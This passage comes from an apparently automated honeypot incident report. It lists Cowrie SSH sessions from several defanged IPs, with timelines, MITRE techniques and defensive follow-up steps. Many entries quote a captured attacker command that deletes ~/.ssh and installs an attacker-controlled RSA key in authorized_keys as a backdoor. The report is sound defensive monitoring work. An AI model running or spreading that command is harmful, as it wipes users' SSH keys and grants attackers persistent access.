| `2026-04-17 07:03:23` | `cowrie.log.closed` |
| `2026-04-17 07:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-140a7301b374

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:03 |
| **Last Seen** | 2026-04-17 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:03:25` | `cowrie.session.connect` |
| `2026-04-17 07:03:25` | `cowrie.client.version` |
| `2026-04-17 07:03:25` | `cowrie.client.kex` |
| `2026-04-17 07:03:26` | `cowrie.login.success` |
| `2026-04-17 07:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454652987060

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:04 |
| **Last Seen** | 2026-04-17 07:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:04:53` | `cowrie.session.connect` |
| `2026-04-17 07:04:53` | `cowrie.client.version` |
| `2026-04-17 07:04:53` | `cowrie.client.kex` |
| `2026-04-17 07:04:53` | `cowrie.login.success` |
| `2026-04-17 07:04:54` | `cowrie.session.params` |
| `2026-04-17 07:04:54` | `cowrie.command.input` |
| `2026-04-17 07:04:54` | `cowrie.command.failed` |
| `2026-04-17 07:04:54` | `cowrie.log.closed` |
| `2026-04-17 07:04:54` | `cowrie.session.params` |
| `2026-04-17 07:04:54` | `cowrie.command.input` |
| `2026-04-17 07:04:54` | `cowrie.session.file_download` |
| `2026-04-17 07:04:54` | `cowrie.log.closed` |
| `2026-04-17 07:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-676449b604dc

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:04 |
| **Last Seen** | 2026-04-17 07:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:04:56` | `cowrie.session.connect` |
| `2026-04-17 07:04:56` | `cowrie.client.version` |
| `2026-04-17 07:04:57` | `cowrie.client.kex` |
| `2026-04-17 07:04:57` | `cowrie.login.success` |
| `2026-04-17 07:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6dcb9187eb4

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:05 |
| **Last Seen** | 2026-04-17 07:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:05:06` | `cowrie.session.connect` |
| `2026-04-17 07:05:06` | `cowrie.client.version` |
| `2026-04-17 07:05:06` | `cowrie.client.kex` |
| `2026-04-17 07:05:07` | `cowrie.login.success` |
| `2026-04-17 07:05:07` | `cowrie.session.params` |
| `2026-04-17 07:05:07` | `cowrie.command.input` |
| `2026-04-17 07:05:07` | `cowrie.command.failed` |
| `2026-04-17 07:05:07` | `cowrie.log.closed` |
| `2026-04-17 07:05:08` | `cowrie.session.params` |
| `2026-04-17 07:05:08` | `cowrie.command.input` |
| `2026-04-17 07:05:08` | `cowrie.session.file_download` |
| `2026-04-17 07:05:08` | `cowrie.log.closed` |
| `2026-04-17 07:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ccd96d1bd0e

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:05 |
| **Last Seen** | 2026-04-17 07:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:05:11` | `cowrie.session.connect` |
| `2026-04-17 07:05:11` | `cowrie.client.version` |
| `2026-04-17 07:05:11` | `cowrie.client.kex` |
| `2026-04-17 07:05:12` | `cowrie.login.success` |
| `2026-04-17 07:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1451ca4bd0

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:06 |
| **Last Seen** | 2026-04-17 07:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:06:00` | `cowrie.session.connect` |
| `2026-04-17 07:06:00` | `cowrie.client.version` |
| `2026-04-17 07:06:00` | `cowrie.client.kex` |
| `2026-04-17 07:06:01` | `cowrie.login.success` |
| `2026-04-17 07:06:02` | `cowrie.session.params` |
| `2026-04-17 07:06:02` | `cowrie.command.input` |
| `2026-04-17 07:06:02` | `cowrie.command.failed` |
| `2026-04-17 07:06:02` | `cowrie.log.closed` |
| `2026-04-17 07:06:03` | `cowrie.session.params` |
| `2026-04-17 07:06:03` | `cowrie.command.input` |
| `2026-04-17 07:06:03` | `cowrie.session.file_download` |
| `2026-04-17 07:06:03` | `cowrie.log.closed` |
| `2026-04-17 07:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24c6cc5762f9

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:06 |
| **Last Seen** | 2026-04-17 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:06:07` | `cowrie.session.connect` |
| `2026-04-17 07:06:07` | `cowrie.client.version` |
| `2026-04-17 07:06:07` | `cowrie.client.kex` |
| `2026-04-17 07:06:08` | `cowrie.login.success` |
| `2026-04-17 07:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b176058662

| Field | Detail |
|---|---|
| **Source IP** | `125.77.133[.]94` |
| **First Seen** | 2026-04-17 07:07 |
| **Last Seen** | 2026-04-17 07:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:07:20` | `cowrie.session.connect` |
| `2026-04-17 07:07:20` | `cowrie.client.version` |
| `2026-04-17 07:07:20` | `cowrie.client.kex` |
| `2026-04-17 07:07:20` | `cowrie.login.success` |
| `2026-04-17 07:07:21` | `cowrie.session.params` |
| `2026-04-17 07:07:21` | `cowrie.command.input` |
| `2026-04-17 07:07:21` | `cowrie.command.failed` |
| `2026-04-17 07:07:21` | `cowrie.log.closed` |
| `2026-04-17 07:07:21` | `cowrie.session.params` |
| `2026-04-17 07:07:21` | `cowrie.command.input` |
| `2026-04-17 07:07:22` | `cowrie.session.file_download` |
| `2026-04-17 07:07:22` | `cowrie.log.closed` |
| `2026-04-17 07:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.77.133[.]94` to AbuseIPDB if not already reported
- [ ] Block `125.77.133[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b8fae0127d4

| Field | Detail |
|---|---|
| **Source IP** | `125.77.133[.]94` |
| **First Seen** | 2026-04-17 07:07 |
| **Last Seen** | 2026-04-17 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:07:24` | `cowrie.session.connect` |
| `2026-04-17 07:07:24` | `cowrie.client.version` |
| `2026-04-17 07:07:24` | `cowrie.client.kex` |
| `2026-04-17 07:07:25` | `cowrie.login.success` |
| `2026-04-17 07:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.77.133[.]94` to AbuseIPDB if not already reported
- [ ] Block `125.77.133[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-112111d93694

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:07 |
| **Last Seen** | 2026-04-17 07:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:07:37` | `cowrie.session.connect` |
| `2026-04-17 07:07:37` | `cowrie.client.version` |
| `2026-04-17 07:07:37` | `cowrie.client.kex` |
| `2026-04-17 07:07:38` | `cowrie.login.success` |
| `2026-04-17 07:07:39` | `cowrie.session.params` |
| `2026-04-17 07:07:39` | `cowrie.command.input` |
| `2026-04-17 07:07:39` | `cowrie.command.failed` |
| `2026-04-17 07:07:39` | `cowrie.log.closed` |
| `2026-04-17 07:07:40` | `cowrie.session.params` |
| `2026-04-17 07:07:40` | `cowrie.command.input` |
| `2026-04-17 07:07:40` | `cowrie.session.file_download` |
| `2026-04-17 07:07:40` | `cowrie.log.closed` |
| `2026-04-17 07:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d614658924e

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:07 |
| **Last Seen** | 2026-04-17 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:07:44` | `cowrie.session.connect` |
| `2026-04-17 07:07:44` | `cowrie.client.version` |
| `2026-04-17 07:07:44` | `cowrie.client.kex` |
| `2026-04-17 07:07:45` | `cowrie.login.success` |
| `2026-04-17 07:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aeeee44719f

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:08 |
| **Last Seen** | 2026-04-17 07:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:08:27` | `cowrie.session.connect` |
| `2026-04-17 07:08:27` | `cowrie.client.version` |
| `2026-04-17 07:08:27` | `cowrie.client.kex` |
| `2026-04-17 07:08:28` | `cowrie.login.success` |
| `2026-04-17 07:08:28` | `cowrie.session.params` |
| `2026-04-17 07:08:28` | `cowrie.command.input` |
| `2026-04-17 07:08:28` | `cowrie.command.failed` |
| `2026-04-17 07:08:28` | `cowrie.log.closed` |
| `2026-04-17 07:08:29` | `cowrie.session.params` |
| `2026-04-17 07:08:29` | `cowrie.command.input` |
| `2026-04-17 07:08:29` | `cowrie.session.file_download` |
| `2026-04-17 07:08:29` | `cowrie.log.closed` |
| `2026-04-17 07:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a61833358937

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:08 |
| **Last Seen** | 2026-04-17 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:08:31` | `cowrie.session.connect` |
| `2026-04-17 07:08:31` | `cowrie.client.version` |
| `2026-04-17 07:08:32` | `cowrie.client.kex` |
| `2026-04-17 07:08:32` | `cowrie.login.success` |
| `2026-04-17 07:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1864865d881

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:08 |
| **Last Seen** | 2026-04-17 07:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:08:49` | `cowrie.session.connect` |
| `2026-04-17 07:08:49` | `cowrie.client.version` |
| `2026-04-17 07:08:49` | `cowrie.client.kex` |
| `2026-04-17 07:08:49` | `cowrie.login.success` |
| `2026-04-17 07:08:50` | `cowrie.session.params` |
| `2026-04-17 07:08:50` | `cowrie.command.input` |
| `2026-04-17 07:08:50` | `cowrie.command.failed` |
| `2026-04-17 07:08:50` | `cowrie.log.closed` |
| `2026-04-17 07:08:50` | `cowrie.session.params` |
| `2026-04-17 07:08:50` | `cowrie.command.input` |
| `2026-04-17 07:08:50` | `cowrie.session.file_download` |
| `2026-04-17 07:08:50` | `cowrie.log.closed` |
| `2026-04-17 07:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e1ed4712fcc

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:08 |
| **Last Seen** | 2026-04-17 07:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:08:52` | `cowrie.session.connect` |
| `2026-04-17 07:08:52` | `cowrie.client.version` |
| `2026-04-17 07:08:53` | `cowrie.client.kex` |
| `2026-04-17 07:08:53` | `cowrie.login.success` |
| `2026-04-17 07:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5ae32fc5ce1

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:10 |
| **Last Seen** | 2026-04-17 07:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:10:09` | `cowrie.session.connect` |
| `2026-04-17 07:10:09` | `cowrie.client.version` |
| `2026-04-17 07:10:09` | `cowrie.client.kex` |
| `2026-04-17 07:10:10` | `cowrie.login.success` |
| `2026-04-17 07:10:10` | `cowrie.session.params` |
| `2026-04-17 07:10:10` | `cowrie.command.input` |
| `2026-04-17 07:10:10` | `cowrie.command.failed` |
| `2026-04-17 07:10:11` | `cowrie.log.closed` |
| `2026-04-17 07:10:11` | `cowrie.session.params` |
| `2026-04-17 07:10:11` | `cowrie.command.input` |
| `2026-04-17 07:10:11` | `cowrie.session.file_download` |
| `2026-04-17 07:10:11` | `cowrie.log.closed` |
| `2026-04-17 07:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90512d309cf

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:10 |
| **Last Seen** | 2026-04-17 07:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
